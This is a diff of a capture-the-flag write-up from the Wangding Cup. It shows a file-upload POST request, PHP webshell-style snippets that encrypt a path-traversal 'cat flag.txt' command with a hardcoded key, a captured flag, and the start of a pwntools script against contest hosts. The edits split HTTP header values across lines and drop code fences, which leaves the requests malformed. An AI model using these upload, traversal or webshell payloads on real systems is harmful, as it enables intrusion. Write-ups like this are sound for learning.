@@ -22,16 +22,20 @@ web1
 数据包:
 
 POST /upload.php HTTP/1.1
-Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
+43000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+131.0) Gecko/20100101 Firefox/131.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: multipart/form-data; boundary=---------------------------234681467240373262723660237873
 Content-Length: 514
-Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000
+Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
+43000
 Connection: close
-Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000/upload.php
+Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
+43000/upload.php
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
@@ -199,16 +203,20 @@ wdflag{de605a3746fdc919}
 
 ```
 POST /upload.php HTTP/1.1
-Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
+43000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+131.0) Gecko/20100101 Firefox/131.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: multipart/form-data; boundary=---------------------------234681467240373262723660237873
 Content-Length: 514
-Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000
+Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
+43000
 Connection: close
-Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000/upload.php
+Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
+43000/upload.php
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
@@ -222,11 +230,6 @@ Content-Disposition: form-data; name="submit"
 
 ä¸ä¼ 
 -----------------------------234681467240373262723660237873—
-```
-
-
-
-```
 <?php error_reporting(0);
 header('Content-type: text/html; charset=utf-8');
 $p8 = '3b7430adaed18facca7b799229138b7b';
@@ -252,11 +255,6 @@ function d($D, $K)
 
 echo e("cat ../../../../../../../../flag.txt", $p8);
 ?>
-```
-
-
-
-```
 <?php error_reporting(0);
 header('Content-type: text/html; charset=utf-8');
 $p8 = '3b7430adaed18facca7b799229138b7b';
@@ -283,11 +281,6 @@ function d($D, $K)
 echo d("TURNeU9UWTBOelUwTmprd05UUTVORmhoU2xadVkydEVhWFFyVTJoYVVqTXZWSE5CUTBOWlRtOWtha3RqVUc5dVFUVnpZMHB0ZUhsTmVISnZaaTlYU25sYWQwUm9XVEJHY1dWeVNHVlhXR0k9
 ", $p8);
 ?>
-```
-
-
-
-```
 from pwn import *
 host = "0192c6987f867c18b31f18e2c806640a.dl7n.dg04.wangdingcup.com"
 port = 43007
